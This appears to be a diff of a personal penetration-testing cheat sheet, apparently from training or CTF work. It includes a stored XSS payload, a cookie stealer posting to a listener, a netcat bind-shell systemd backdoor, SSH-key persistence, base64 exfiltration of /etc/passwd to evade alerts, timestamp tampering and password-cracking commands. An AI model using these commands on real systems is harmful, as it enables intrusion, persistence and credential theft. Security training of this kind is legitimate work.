@@ -1,5 +1,4 @@
-/////////////Resources\\\\\\\\\\\\\
-
+/////////////Resources\\\\\\\\\\\\\ 
 https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
 -or-
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
@@ -15,6 +14,7 @@ https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/
 https://captmeelo.com/exploitdev/osceprep/2018/06/27/vulnserver-trun.html
 http://10.50.25.12/uploads/
 http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html
+#Look into reptile rootkit
 
 /////////HTTP reponse codes////////
 10X == Informational
@@ -39,15 +39,15 @@ wget --mirror <ip>	#recursively copies all webpages it finds, not stopped by rob
 	egrep -r '\b[[:alnum:]]{20}\b'	#cd into the dir wget creates, this looks for hashed flags
 	egrep -ir '\bf..g\b' 		#cd into the dir wget creates, this looks for mutated "flag"
 
-/////////proxychains with firefox/////////
+//Proxychains w/ firefox setup
 addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050
 
 /////////CURL/////////
 curl -o stuff.html http://website/stuff.html
 curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
 
-----------------------------------
 /////////Stored XSS/////////
+----------------------------------
 <img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">
 
 /////////js cookie stealer to send to nc listener/////////
@@ -65,16 +65,14 @@ fclose($steal);
 ?>
 -----------------------------------
 
-///////// ReverseEngineering Notes \\\\\\\\\\\
-
+///////// ReverseEngineering Notes \\\\\\\\\\\ 
 objdump -d -M intel <filename>	
 md5sum *
 strings <on-file>
 ltrace ./<linux exe>
 strace ./<linux exe>	#more info than you might want
 
-///// GDB \\\\\
-
+///// GDB \\\\\ 
 gdb
 file <filename>
 show disa
@@ -121,21 +119,13 @@ admin' UNION SELECT name,2,3,4,5 from session.user;#
 
 ////// Post Exploitation \\\\\\
 //Linux Enumeration
-ip a 
-uname -a
-cat /etc/os-release
-ss -tupln
-ss -atpn | grep -i estab
 nc localhost <port on loopback>
 cat /sys/class/dmi/id/ *
-w	-or-	who
-cat /etc/hosts
-cat /etc/passwd
 systemctrl list-unit-files --state=enabled
 journalctl -u ssh 		(can append SYSLOG_FACILITY=authpriv)
 chkconfig
 |tee		#send to a file and to stdout
-lsof  -p <prosessid>
+lsof -p <prosessid>
 cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
 
 //SSH Multiplexing (AKA control sockets)
@@ -146,30 +136,14 @@ ssh -S /tmp/s root@10.50.20.220 -L 2222:rustyvega.com:1234	#create a port forwar
 //Exfil data bypassing keyword alerters 
 cat /etc/passwd | base64		#encode the data and then decode once exfilled (base64 -d)
 
-//Windows Enumeration
-tasklist /v
-tasklist /svc
-ipconfig /all
-
 ///////// Linux Priv Esc \\\\\\\\\ 
-sudo -l				#what can i do?
-/usr/bin/apt-get		#allows you to use "*******GTFOBINS.com*********"
 /bin/cat /var/log/syslog*	#allows you to add another file to look at by appending a space and file to the end
-
-sudo -s				#may give root privs
-
-find / -type f -perm /4000 -ls 2>/dev/nul	# -ls is optional
-/usr/bin/find			#not normal to be SUID
-
-find /etc/cron*
-cat /etc/crontab	-or-	/etc/cron.d
-find /etc/cron* -writable
 
 ls -l /sbin/init
 systemctl
 
-----------------------
 //Physical Access, Gaining Root Access
+----------------------
 up and down arrow to interrupt
 hit E at the grub menu
 add to linux item:
@@ -177,22 +151,18 @@ add to linux item:
 mount -o remount,rw /
 ----------------------
 
-/etc/crontab	-or-	/etc/cron.d
-
-------------------------------
 //Put this in a file that a user will run
+----------------------
 nc -lp 4444 -e /bin/bash
 -or-
 echo "pub_sshkey" >> $HOME/.ssh/authorized_keys
 ------------------------------
 
-#Look into reptile rootkit
-
+//Simple backdoor
 --------------------------
-#Simple backdoor
 cp /lib/systemd/system/cron.service evil.service
 add to execStart item:
-	/bin/nc -lp 4444 -e /bin/bash
+    /bin/nc -lp 4444 -e /bin/bash
 systemcrl enable evil
 systemcrl start evil
 --------------------------
@@ -216,15 +186,8 @@ touch -r 3.txt 1.txt
 
 //////////////////// Windows PRIV ESC \\\\\\\\\\\\\\\\\\ 
 //Finding Vulnerabilities
-schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6 | more
-wmic service list full
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System	#checking UAC settings
 
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System		#checking UAC settings
-
-icacls c:\users\<username>
-
------------------------------
 //Malicious dll
 #Within Procmon
 filter --> add the following:
@@ -254,13 +217,9 @@ for /f "tokens=2 delims='='" %a in ('wmic service get PathName /FORMAT:LIST ^|fi
 
 reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /v ImagePath | Select-String -Pattern "ImagePath" -CaseSensitive | Select-String -Pattern "system32" -NotMatch
 
-wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
 ------------------------------
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\``
-
-winlogonautologon ?
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon
 
 auditpol /get /category:*
 auditpol /get /category:* | findstr /i "success failure"
@@ -273,13 +232,7 @@ wevtutil el
 wmic ntevent where "logfile="<LOGNAME>" list full
 Get-Eventlog -List
 
-doskey /history
-
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
-
 ==================================================================================================
-python -m SimpleHTTPServer		#python simple http server
-
 //John the Ripper
 john --wordlist=passwordlist --rules --shells=sh,csh,tcsh,bash shadow #only crack accounts with shells
 john --wordlist=passwordlist --rules --users=0 shadow #only crack root accounts
@@ -302,8 +255,8 @@ ssh-keygen -t rsa 							#creates ~/.ssh id_rsa id_rsa.pub
 ssh-copy-id -i ~/.ssh/id_rsa.pub user@host 				#adds id_rsa.pub to remote user ~/.ssh/authorized_keys
 ssh -J user@pivot:port user@internalhost:port 				#tunnel straight to internal hosts thru pivot
 
------------------------------
 //Scan Script
+-----------------------------
 #!/bin/bash
 
 #sudo arping -c 2 192.168.65.30 | grep "index" | sort -u | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
@@ -318,4 +271,3 @@ for i in "${arr[@]}"
          done | grep -E "open|succ"
 done
 -----------------------------
-dpkg -l | grep pam
